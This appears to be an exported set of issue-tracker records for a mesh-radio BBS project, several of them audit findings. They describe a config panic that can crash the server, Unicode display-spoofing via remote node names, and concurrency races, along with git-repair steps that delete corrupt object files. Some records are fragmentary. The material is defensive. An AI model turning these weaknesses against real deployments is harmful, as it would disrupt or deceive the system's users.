description: Discovered during the #227 (supply-drop-bbs-4ju) hostile code audit. toml_edit's Index/IndexMut panics if the indexed section exists but isn't a table (e.g. config.toml has `[bbs] name = 1` where `[bbs.foo]` bracket-indexing is then attempted). Call sites doing this unguarded bracket-assignment: bbs-web's api_patch_config, api_update_native_plugin, doc_set_radio_field/doc_set_mesh_field (crates/bbs-web/src/lib.rs), and 4 of the 6 config_edit_* CLI wrappers in src/main.rs. Under the release-min profile (panic = "abort", used for shipped release builds), a panic here aborts the entire process -- one malformed config value written by any path (including a prior manual edit) crashes the server for every connected user on the next PATCH request that touches that section. Pre-existing pattern, not introduced by #227 (that PR only added locking around these bodies). See .audit/REPORT.md in that PR's branch for full details.

title: use_gpiod_backend: true crashes at runtime (upstream SX1262Radio/GPIOPinManager bug)

title: Cancelled restore-upload future can orphan a spawn_blocking file copy
description: In api_upload_restore (crates/bbs-web/src/lib.rs), if a client disconnects while admin_stage_restore(...).await is pending, axum drops the handler future mid-poll. But stage_restore's EXDEV-fallback tokio::fs::copy is backed by a spawn_blocking task that Tokio's own docs confirm cannot be aborted and keeps running to completion on its OS thread regardless of whether anything is still awaiting it. The restore_lock (tokio::sync::Mutex) guarding this critical section is released when the future is dropped, so a second request (another upload, or a confirm) can acquire the lock and proceed while the orphaned copy is still writing to the shared pending_restore.staged.db path — reintroducing the same-destination race the lock was meant to prevent, just delayed. Found by the Concurrency reviewer persona during the #195 hostile-code-audit (PR feat/issue-195-backup-restore-gui).
acceptance_criteria: Either (a) wrap the upload+stage sequence in a Drop guard that owns the temp file end-to-end independent of the HTTP response future's lifetime, or (b) run the write+stage+cleanup sequence inside a detached tokio::spawn that the handler awaits via a channel, so cancelling the client-facing future does not abandon in-flight filesystem work. A regression test should simulate cancellation (e.g. drop the future mid-await) and confirm no write lands on the shared path after the lock is released.
notes: Deferred from the #195 restore-feature PR by explicit user decision: user chose 'fix the 2 new criticals + cheap hardening' scope, and this fix requires a more involved ownership/lifecycle change than the cheap-hardening items (confirm-marker split, WAL checkpoint, safety-snapshot pruning, EXDEV fallback, room-walk-order check, restore_lock mutex) that were completed. Medium severity, Medium confidence per the audit.

Fixed by adding a mesh_key_tx field + register_mesh_key_ops override + mesh_key_tx() accessor to MockHost (crates/bbs-plugin-api/src/testing.rs), mirroring BbsHost's real production pattern exactly. New test stale_removal_via_key_rx_is_skipped_when_a_fresher_protect_landed in crates/bbs-mesh/tests/transport.rs: protects a contact, unprotects it (simulating the delete flow's first step), re-DMs to re-protect (confirmed via the wire), THEN sends the stale RemoveContact request directly through the harness's key_tx handle, and confirms it's correctly declined and the contact stays protected. Same caveat as the analogous already-existing Meshtastic test: proves the guard is correct against pre-processing settled state, not a genuine mid-request interleaving (key_rx and inbound-frame processing share one event_loop task with no yield point between them) -- documented explicitly in the test's own doc comment. title: Repair corrupted git loose objects (found during Phase 3 audit)
description: git fsck --full found 15 corrupted loose objects under .git/objects (e.g. 850084fcc77ee73d9c3dca9258f4c13c954c27e7, reachable via refs/tags/v0.11.0). acceptance_criteria: git fsck --full reports zero corrupted/missing objects; git log --all, git gc, and a fresh clone all succeed without error; refs/tags/v0.11.0 resolves cleanly.
notes:
git fsck --full found 15 corrupted loose objects under .git/objects (e.g. 850084fcc77ee73d9c3dca9258f4c13c954c27e7, reachable via refs/tags/v0.11.0). Resolution steps (run from a Linux/WSL shell in the repo root, per CLAUDE.md's Linux-only mandate):
1. Confirm which objects are actually corrupt and reachable: git fsck --full 2>&1 | grep 'corrupt or missing' -- note every hash printed.
2. For each corrupt hash, delete only that specific loose-object file (NOT a broad git gc/prune): m .git/objects/<first-2-chars-of-hash>/<remaining-38-chars-of-hash> for each hash from step 1.
3. Re-fetch everything from origin so git redownloads the now-missing objects as part of a pack: git fetch --all --tags --force (the --force here only affects local ref pointers being fast-forwarded from the remote, not history rewriting -- safe).
4. Re-run git fsck --full and confirm zero 'corrupt or missing' lines are printed.
5. If any hash from step 1 still fails to resolve after the fetch (meaning the object doesn't exist on origin either), that tag/commit's content may be genuinely unrecoverable from this remote -- check the other configured remote (git remote -v shows a second remote, ThomasEg/thomaseg fork) with git fetch ThomasEg --all --tags and repeat steps 3-4 against it before concluding data loss.
6. Once fsck is clean, verify normal operations work: git gc and git clone <this-repo-url> /tmp/verify-clone (or equivalent) both succeed without error.
UPDATE 2026-09-02: confirmed this ALSO blocks 'git push' (not just fetch --all/gc/clone) -- git push origin feat/persist-mesh-contacts failed with the same 'unable to unpack 850084fcc77ee73d9c3dca9258f4c13c954c27e7 header... loose object is corrupt' error, plus 'the remote end hung up unexpectedly'. Also newly confirmed: 'git fetch origin next' (a single-branch fetch, not --all) fails the same way, and 'git merge-base next main' / 'git rev-list next..main' both fail too -- so this corruption sits somewhere in history reachable from comparing next and main, not just from --all/tags. Workaround used to land PR #189 (feat/persist-mesh-contacts) despite this: did a completely fresh 'git clone --branch next https://github.com/Mesh-America/supply-drop-bbs.git' into a separate directory (bypassing the corrupted local .git/objects entirely), copied the feature's changed files over, committed and pushed from there. This works but isn't sustainable -- every future push from the main working copy at D:\Projects\supply-drop-bbs will keep failing until this is actually repaired. The resolution steps already on this issue (delete the specific corrupt loose object files, then git fetch --all --tags --force to redownload from origin's pack) are still the right fix and still need explicit user execution/confirmation per repo-safety norms -- untouched by an agent this session, exactly as before.

other bits reserved") is itself wrong, but — unlike T002/T033's in-passing doc-comment fixes to files they already edit — no task in this list actually touches `types.rs`, so the comment itself is never corrected; worth a one-line fix whenever that file is next touched for any reason, not blocking here. **On `Err` (round-15 fix, [research.md](research.md) Decision 8a)**: call `host.advert_bus().revert_protect(pubkey, snapshot.generation)` (T019a — passing the snapshot's own `generation`, so the revert only fires if this exact protect is still the one on record — **round-27 fix, BLOCKING**: this call was never migrated when T019a's signature changed from `expected_protected_at: u64` to `expected_generation: u64` in round 24; In `crates/bbs-meshtastic/src/lib.rs`, change `request_session_key` (`lib.rs:1154-1170`) to send via `cmd_tx.try_send(...)` instead of `cmd_tx.send(...).await` — this closes a blocking-send gap this feature's new caller would otherwise hit on a hot path, and also benefits the existing `SetOwner`/`Reboot` callers (see [research.md](research.md) Decision 8's round-3 correction). **Also add a timeout for the session-key handshake itself (round-16 fix, [research.md](research.md) Decision 8b)**: add `session_requested_at: Option<Instant>`, set alongside `session_requested = true` in `request_session_key`; extend `event_loop`'s existing `reap.tick()` arm (`lib.rs:769-773`, which already abandons a stale `pending_admin` GET the identical way) to also reset `session_requested = false`/clear `session_requested_at` once it's been more than ~30 seconds — without this, a dropped first session-key response latches `session_requested` true forever for that connection, silently stalling every later `SetFavoriteNode`/`RemoveFavoriteNode` write behind a request that will never be retried, while `decide_favourite` already committed local "Protected" state believing it succeeded. **Also clear `last_session_passkey` on `ClientEvent::Disconnected` (round-18 fix, a more common bug than T035's own timeout addresses)**: `last_session_passkey` (`event_loop`'s own local, never cleared today — the `Disconnected` arm only resets `session_requested`/`auto_applied`) survives across a disconnect/reconnect and gets reused on the very next `ConfigCompleteId` to satisfy `flush_deferred_writes`'s gate *before* the connection's own freshly-requested passkey could possibly have arrived — draining the queue (including this feature's `SetFavoriteNode`/`RemoveFavoriteNode`) against a stale credential, silently rejected if firmware validates passkeys per-connection. description: [US1] In `crates/bbs-mesh/src/session.rs`, add `pending_protect: HashSet<[u8; 6]>` to `SessionState`, with plain insert/remove/contains access (no combined-lock method needed — see [research.md](research.md) Decision 3's round-4 rewrite). **Round-20 addition, corrected rounds 21/26**: bound its growth against adversarial filling (T001b item (f)'s underlying concern) — track each entry's insertion time (`HashMap<[u8; 6], Instant>` instead of a bare `HashSet`) and lazily sweep entries older than `const PENDING_PROTECT_TTL_SECS: u64 = 86_400` (24 hours — **round-26 fix**: previously specified only as "on the order of hours," now a concrete constant; comfortably longer than any commonly-configured broadcast interval, distinct from `PROTECT_GRACE_SECS`, which serves a different purpose) on each new insert, an O(n) scan of the existing set. **Round-21 fix — the originally-specified size-based cap (evict oldest-inserted once exceeded) is itself exploitable**: insertion order can't distinguish an attacker's abandoned garbage entry from a legitimate sender's genuinely-still-resolving one, so an attacker flooding many bogus entries within a legitimate sender's resolution window could evict that legitimate entry before it resolves, silently defeating FR-004 (see [research.md](research.md) Decision 3's round-21 correction). A TTL sweep closes that specific *adversarial* exploit — an attacker can no longer cheaply and deliberately evict a chosen victim's entry by flooding — while still bounding eventual memory the same way the rejected cap intended to. **Round-26 disclosure — this does not fully close the underlying tension for every case**: a legitimate node whose own advertising interval exceeds `PENDING_PROTECT_TTL_SECS` (24 hours — this document notes Meshtastic's broadcast interval is configurable with no firmware-enforced upper bound), *and* whose very first mesh contact is a DM sent before its own first broadcast, could still have its pending mark swept before resolving — an accepted, disclosed, narrow residual case (see [research.md](research.md) Decision 3's round-26 correction for why this is materially narrower than the exploit it replaced, and why no purely age/size-based rule closes it completely). A mechanical implementer default, not gated on maintainer input. **Also wire `pending_protect.remove(&prefix)` into the existing `remove_by_prefix` (`session.rs:172-179`)** — a free partial mitigation for the accepted unbounded-growth limitation, though narrower than it sounds (round-9 correction): `remove_by_prefix`'s only non-test call site is the host-side stale-session-expiry branch (`transport.rs:1917-1933`), not ordinary logout (`Response::LoggedOut` never touches `SessionState`/`pending_protect` at all) — so this mitigates abandoned-and-expired identities specifically, not the general logout case the original phrasing implied. It can also erase a still-genuinely-pending entry if a stale-session refresh happens to fire within the same `dispatch_message` call that just (re-)inserted it; self-heals on the sender's next message or advert, per this feature's existing accepted-limitation framing elsewhere, so no additional fix is proposed
close_reason: Implemented: SessionState.pending_protect (HashMap<[u8;6], Instant> with a 24h TTL sweep per Decision 3's round-21/26 fixes), mark_pending_protect/clear_pending_protect/is_pending_protect. 3 new tests.

title: Remaining unsanitized bbs.name display surfaces: config echo/settings form, startup logs
description:
Found by the #228 hostile audit (Security + Hostile QA reviewers), lower priority than the two fixed surfaces (outbound MeshCore advert + welcome banner, and inbound remote-node names in Adverts/Contacts) since these only affect the sysop viewing their own configuration, not a third party being deceived:

1. validate_mesh_node_name (used by the sysop-gated PATCH /config) still accepts Unicode Format-category codepoints (deliberately -- see mesh_name.rs's validate_does_not_reject_format_codepoints test and its doc comment for the reasoning). A spoofing-capable name is therefore stored verbatim in config.toml and echoed verbatim by GET /config, with nothing indicating that the stored value and the actually-broadcast value (sanitized by truncate_mesh_node_name at send time) have diverged. crates/bbs-web/web/src/pages/SettingsPage.vue's client-side validation only checks C0/C1 control-character ranges (mirroring char::is_control()), so the Settings form echoes a potentially spoofed name back into its own input field with no warning either.

2. src/main.rs:767-786 logs cfg.bbs.name raw via tracing (two startup log lines), bypassing the sanitizer. Lower severity than a UI display surface, but still worth cleaning up for consistency and to avoid confusing a sysop reading logs.
acceptance_criteria: Either: (a) SettingsPage.vue's client-side check is extended to flag Format-category codepoints too (matching the actual server-side truncate_mesh_node_name behavior, so the sysop sees a warning rather than being surprised the broadcast name differs from what they typed), and/or a note is added to GET /config's response or the settings UI when the stored name differs from what would actually be sent; and (b) the two startup log lines route bbs.name through bbs_core::mesh_name::strip_display_spoofing_codepoints before logging. Or: an explicit decision that these are acceptably low-risk (sysop-authenticated, self-only) and out of scope, documented as such.

title: Connecting-user greeting embeds an unsanitized remote node's advertised display name
description: Found while implementing #228's fix (Unicode display-spoofing in the BBS's own bbs.name). crates/bbs-mesh/src/transport.rs:2335-2343's connect-time greeting substitutes {name} with either the auto-login username (subject to the BBS's own username policy) OR, when no auto-login applies, host.advert_bus().name_by_prefix(&sender_prefix) -- the connecting mesh node's OWN self-reported advertised display name, taken as-is from an advert frame the BBS received over the mesh. This is a distinct vector from #228 (which is about THIS BBS's own configured bbs.name being spoofable): here, a malicious or careless mesh participant could advertise themselves with a name containing Unicode display-spoofing codepoints (U+202E RIGHT-TO-LEFT OVERRIDE, zero-width joiners, etc.), and the BBS would echo that raw, unsanitized name back into ITS OWN greeting shown to a different connecting user -- rendering spoofed text sourced from an untrusted third party, not from the BBS operator's own config. Needs its own investigation: does advert_bus already sanitize incoming names anywhere (unclear, not checked), and if not, whether to sanitize at ingestion (in advert_bus itself, protecting every future consumer of advertised names) or at this specific display site (narrower, easier to miss a future new consumer).
acceptance_criteria: A remote node advertising a display name containing Unicode Format-category codepoints (e.g. U+202E) does not have those codepoints reach the greeting text shown to a connecting user -- either advert_bus sanitizes on ingestion (preferred, protects all consumers) or this specific display site does. A test demonstrates the spoofing codepoints are stripped before the greeting is built.

title: api_patch_config's post-lock in-memory state sync can diverge from disk under concurrent PATCHes
description: Discovered during the #227 (supply-drop-bbs-4ju) hostile code audit. api_patch_config (crates/bbs-web/src/lib.rs) applies its config.toml write inside the new cross-process lock, but the post-write side effects that update in-process state (log-level reload via state.log_reload, and Host location/share-in-advert state via state.host.set_node_location/set_share_location_in_advert) run AFTER the lock is released, using values extracted from PatchConfigOutcome. Two concurrent PATCH requests can interleave their post-lock side effects in a different order than their locked writes committed in, leaving the running server's in-memory state permanently out of sync with what's actually on disk (e.g. the last writer to the FILE isn't necessarily the last writer to apply its in-memory location state). Pre-existing characteristic -- state sync was never itself lock-protected, #227 didn't change this. Lower urgency than the other #227 audit follow-ups since it's a narrow window requiring genuinely concurrent sysop PATCH requests, and the impact is transient-to-eventually-consistent rather than data loss.
acceptance_criteria: Either: (a) the post-write state-sync side effects are moved inside the same locked critical section (may require restructuring what with_config_lock's closure returns, or taking a second short-lived lock around just the state update), or (b) a documented decision that eventual consistency here is acceptable, with a code comment explaining why and what the actual convergence guarantee is (e.g. "last write to config.toml wins for on-disk state; in-memory state converges on next request or restart").

title: PATCH /api/config's location/share_in_advert writes aren't atomic with each other
description:
crates/bbs-web/src/lib.rs's PATCH /api/config handler calls Host::set_node_location and Host::set_share_location_in_advert as two independent, separately-locked writes when a single request changes both fields. A concurrent Host::advert_location_state() read (the atomic snapshot added for #226) can land between these two writes and observe a transient combination that doesn't match either the pre- or post-request intended state. Narrower and lower-severity than #226 (that bug combined data from two ARBITRARILY separated points in time via two independent trait-method calls with no bound on the gap; this one can only ever observe a value the state genuinely held at some real instant, bounded to the width of one PATCH request), but a real residual gap in the same area.

## Context
Found by Concurrency reviewer persona during hostile audit of the #226 fix (2026-09-11). Severity Medium. .audit/findings-226.jsonl.
acceptance_criteria: Either: BbsHost gains a combined setter (e.g. set_advert_location_state(location, share)) that updates both fields under one write-lock acquisition, and the PATCH handler uses it when both fields are touched in the same request; or the gap is explicitly documented as accepted (already partially done inline in host.rs's LocationState/advert_location_state doc comments) with no further action needed.

description:

This is a pre-existing repo-wide convention (also true in ci.yml/docs.yml for other third-party actions), not unique to this one line -- fixing it consistently is a broader policy decision, not a one-line patch.

## Context
Found by Security reviewer persona during hostile audit of the cross-migration fix for the ubuntu-22.04 brownout Critical (2026-09-10). Consolidated finding cross-migration-11 in .audit/findings-cross-migration.jsonl.
acceptance_criteria: Decide and apply a consistent action-pinning policy repo-wide (SHA-pin all third-party actions, or explicitly accept tag-pinning as the project's stance) rather than pinning ad hoc per file.

title: release.yml: dtolnay/rust-toolchain@master floating ref is inconsistent with the file's stated pinning philosophy
description:
release.yml pins ubuntu-22.04 specifically to avoid floating-reference drift, but two lines later uses dtolnay/rust-toolchain@master, itself an unpinned floating ref (confirmed via git ls-remote that master has moved past the only tag, v1). This IS the action's own documented, maintainer-recommended pattern when passing an explicit toolchain input, so it is not a bug today -- but the file gives zero acknowledgment that this is an intentional exception, which risks a future reader either fixing it incorrectly or assuming the ubuntu-latest mistake was overlooked here too.

## Context
Found by Verifier during retroactive hostile audit of #239 (2026-09-09), claim releaseyml-10 in .audit/verdicts-retroactive-releaseyml.jsonl. Severity Medium, verdict Misleading/fragile.
acceptance_criteria: Add a short comment at the rust-toolchain step noting this ref is intentionally floating per the action's own documented guidance (unlike ubuntu-latest), or pin to a specific commit SHA within master's history if reproducibility is preferred.

title: pymc-companion.py: begin() error message and autoadd_config comment are inaccurate
description:
Two smaller pre-existing correctness gaps found during the openhop_core migration audit (#232 / supply-drop-bbs-4yv), unrelated to that rename:

1. 'if radio.begin() is False:' (pymc-companion.py, near the radio init call) only catches the specific case where SX1262Radio.begin() returns False -- but other internal init failures (e.g. IRQ-pin setup, which is exactly the wiring/SPI scenario the adjacent log.error("...check wiring and SPI settings") message describes) are re-raised as RuntimeError instead, bypassing that friendly error message and producing a raw traceback instead.

2. The autoadd_config comment/default (0x0F, described as covering 'every type' / all contact types) excludes the sensor auto-add bit -- the comment overstates what the default bitmask actually does.
acceptance_criteria: begin() failures are handled with a try/except (or equivalent) so the 'check wiring and SPI settings' message (or an equivalently useful one) is shown for RuntimeError-raising failure paths too, not just the is False case. The autoadd_config comment is corrected to accurately describe which contact types 0x0F actually covers, or the default is changed to genuinely cover every type if that was the original intent.
close_reason: Fixed: radio.begin() now wraps in try/except so RuntimeError-raising init failures get the same friendly error message as the is-False case; autoadd_config comment corrected in both pymc-companion.py and pymc-companion.yaml.example.

title: validate_mesh_node_name doesn't block Unicode display-spoofing characters
description: bbs_core::mesh_name::validate_mesh_node_name only rejects Cc control chars via is_control(), not Cf (Format) codepoints like U+202E RIGHT-TO-LEFT OVERRIDE or zero-width chars, which can spoof displayed text in the web UI's Adverts/Contacts pages. Preferred fix: sanitize in truncate_mesh_node_name (the existing single choke point that already runs right before every advert transmission) rather than adding rejection logic to all three input surfaces separately, so the fix applies uniformly including to a hand-edited config.toml. See GH #228.
acceptance_criteria: truncate_mesh_node_name strips Cf-category/zero-width/bidi-override codepoints in addition to its existing byte-budget truncation; a test confirms a name containing U+202E or similar is sanitized before reaching the wire.
close_reason: Merged in PR #294: strips Unicode display-spoofing codepoints from mesh node names at truncate_mesh_node_name (outbound advert + welcome banner) and to_advert_response (inbound remote-node names in the web admin's Adverts/Contacts panels).

title: MeshCore Pi HAT (pymc_core/openhop_core bridge) not adverting / not sharing GPS position
description: Production WeHooper4 Pi HAT (bare SX1262, no onboard MCU -- protocol runs as host-side pymc_core/openhop_core software, NOT real MeshCore firmware) does not appear to broadcast self-adverts with GPS position, possibly not adverting at all. Same config worked on T114 (real embedded firmware) in test lab. Pulled openhop_core's current upstream source: set_other_params() and advertise() both correctly implement advert_loc_policy gating matching our wire format -- current openhop_core SHOULD work with the share_in_advert feature (v1.1.0). Leading hypotheses: (1) version skew -- Pi's installed pymc_core/openhop_core predates CMD_SET_OTHER_PARAMS support, (2) AppStart/SelfInfo handshake not completing against this bridge so sync_advert_location_policy's device_other_params cache never populates, (3) intermittent bridge connectivity.
acceptance_criteria: Confirmed root cause (bridge version, or handshake failure, or connectivity) via BBS logs and the Pi's installed openhop_core version. If it's a supply-drop-bbs-side gap (e.g. no visible warning when SelfInfo is never received, masking the real problem from the sysop): a clear log/UI signal is added so this class of failure is diagnosable without code archaeology next time. If it's purely an upstream openhop_core version/bug: documented as a known compatibility note (e.g. docs/CONFIG.md) with a minimum supported version once identified.
notes: ROOT CAUSE CONFIRMED (superseding all earlier hypotheses in this issue): not a pymc_core/openhop_core bridge version-skew or handshake issue, and not HAT-specific. MeshCore firmware caps advert app_data at 32 bytes (MAX_ADVERT_DATA_SIZE), clamped BEFORE signature verification. Reporter's configured name ('🇺🇸 Mesh America BBS', 25 bytes -- the flag emoji alone is 8 UTF-8 bytes) fit the 31-byte no-location budget, but combined with share_in_advert's 8-byte lat/lon pushed app_data to 34 bytes, 2 over budget. Every receiver clamped to 32 bytes before verifying, signature no longer matched, advert silently dropped as forged -- no error anywhere in the sending stack. Confirmed live: shortening the name fixed it immediately. Fix: PR #229 adds byte-budget validation (31 bytes normally, 23 with location shared) in setup wizard, CLI, and web UI. Full hostile-audit-verified writeup posted to GH #225.

title: Settings page: unmatched-stored-value fallback option missing on Meshtastic selects
description: The fallback <option> pattern for a stored value absent from the current list exists for Starting room, Timezone, and (as of PR #204) Radio preset, using two different comparison idioms (.includes() vs .some()) with no shared helper. The Meshtastic Region and Modem preset selects have no such fallback at all, despite being equally capable of holding an unmatched stored value.
acceptance_criteria: Meshtastic Region and Modem preset selects get the same fallback-option treatment as Radio preset.
close_reason: Fixed in #215: added the fallback-option pattern to the Meshtastic Region and Modem preset selects.

title: MeshCore radio: path-width hint omits old-firmware skip behavior
description: The routing-path-width hint (SettingsPage.vue:1223-1228) doesn't mention that this setting is silently skipped on firmware too old to report SelfInfo. Confirmed in crates/bbs-mesh/src/transport.rs: the SetPathHashMode push only happens inside the SelfInfo branch of the connect handler, with an existing code comment confirming older firmware without SelfInfo is left on its own default.
acceptance_criteria: Hint text notes the setting has no effect on firmware that doesn't report SelfInfo on connect.
close_reason: Fixed in #215: routing-path-width hint now notes it has no effect on firmware too old to report SelfInfo.

title: MeshCore radio: TX-power range not tied to a documented hardware spec
description: The TX power field's min="-10" max="30" bounds (SettingsPage.vue:1255) aren't traceable to any backend validation or documented spec. MeshCore-compatible hardware varies by device, so this range may be too permissive or too strict depending on what's connected. A precise fix needs per-device hardware documentation, which is out of scope for this pass.
acceptance_criteria: Hint text near the TX power field clarifies these are soft UI guardrails, not backend-enforced or device-verified limits.
close_reason: Fixed in #215: TX-power hint now clarifies the range is a UI guardrail, not a verified device limit.

title: MeshCore radio: duplicate preset names would collide silently
description: RADIO_PRESETS (backend, crates/bbs-web/src/lib.rs) is a hardcoded list. If a future edit ever introduced two entries with the same name, Vue would receive duplicate v-for :key values, and applyPreset()'s .find() plus the fallback-option's .some() would both silently resolve to only the first match, making the second preset unreachable with no error anywhere.
acceptance_criteria: A Rust unit test asserts every RADIO_PRESETS entry has a unique name, so a future duplicate fails CI instead of shipping silently.
close_reason: Fixed in #215: added radio_presets_have_unique_names Rust test.

title: Meshtastic hint text about preset-derived bandwidth/SF/CR: investigated, not a bug
description: Audit flagged SettingsPage.vue:1308's hint ("Bandwidth, spreading factor, and coding rate are set by the preset") as contradicting the code, since no frontend logic derives those three fields from meshtasticModemPreset. Investigated: MeshtasticLoRaConfig.modem_preset's doc comment and the device round-trip in api_patch_meshtastic_radio_config confirm this is by design - the DEVICE FIRMWARE derives bandwidth/SF/CR from the preset when use_preset=true, ignoring whatever values are sent alongside it. applyMeshtasticRadioFields() correctly refreshes the three refs from the device's confirmed post-apply state. The hint is accurate; the persona that flagged this reviewed the file in isolation without backend/protocol context.
acceptance_criteria: No code change. Closed with investigation notes for the record.
close_reason: Investigated: device firmware derives bandwidth/SF/CR from the preset when use_preset=true; hint text is accurate. See issue notes.

title: MeshCore self_pubkey never set on firmware without CMD_APP_START support
description: Pre-existing gap (predates the Persist Mesh Contacts feature, not introduced by it), surfaced by the code-audit hostile-QA persona while reviewing crates/bbs-mesh/src/transport.rs's Phase 3 dispatch wiring on 2026-09-02. state.lock().self_pubkey is only ever set inside the SelfInfo/Connected handshake branch (transport.rs, search 'self_pubkey = Some(info.pubkey)'). On firmware that returns ERR_CODE_UNSUPPORTED_CMD for CMD_APP_START (see the existing test complete_handshake_unsupported_app_start), that branch never runs, so self_pubkey stays None for the whole connection. Both try_protect_contact and the ContactsFull eviction handler build their exclusion list from self_pubkey -- if it's None, the BBS's own self-registered AdvertBus entry (which typically DOES have adv_type == ADV_TYPE_CHAT, since a BBS radio is configured as a chat-capable node) is no longer excluded from eviction-candidate selection. Worst case on old firmware: the BBS could select its own contact entry as the ContactsFull eviction victim and send RemoveContact against itself. Needs investigation into what identifying data (if any) unsupported-CMD_APP_START firmware actually provides before a fix can be designed -- may be a genuine protocol-level limitation with no clean fix, in which case documenting the risk in docs/PROTOCOL.md (matching this feature's own established pattern for disclosed-not-fixed risks) is the right resolution.
close_reason: Investigated 2026-09-03. Traced the actual code paths definitively rather than guessing: confirmed self_pubkey is set ONLY in the SelfInfo/Connected handshake branch (transport.rs ~955), and confirmed the InboundFrame::NewAdvert handler READS self_pubkey (to detect self-echoes for GPS substitution) but has no mechanism to DISCOVER it from an echo -- it's a pure consumer, not a fallback setter, so there's no chicken-and-egg resolution path already implemented. Also confirmed: when SelfInfo is unavailable, the BBS's own AdvertBus entry (if/when it appears at all, via ordinary contact sync) carries no distinguishing marker from any other real contact -- there is currently no protocol-level signal for 'this record is me' independent of CMD_APP_START's SelfInfo. Considered ExportPrivateKey (used by the existing node export-key CLI command) as an automatic self-identification fallback and rejected it: its firmware support isn't independently verified either, and routinely invoking it on every connection just to self-identify would mean materializing the node's PRIVATE key far more often than necessary for a security-sensitive operation currently gated behind an explicit sysop CLI action -- a worse trade than the gap it would close. Conclusion: genuine protocol-level limitation with no clean fix available from within this codebase (would need either verified documentation of the companion protocol's full command-support matrix across firmware versions, or real hardware access to unsupported-CMD_APP_START firmware to test alternatives). Resolved per this bug's own suggested disposition: documented as a known, accepted, unmitigated-in-code limitation in docs/PROTOCOL.md's new 'MeshCore: self-identification requires CMD_APP_START support' section, alongside the two other disclosed tail risks (Meshtastic firmware crash, MeshCore prefix collision).
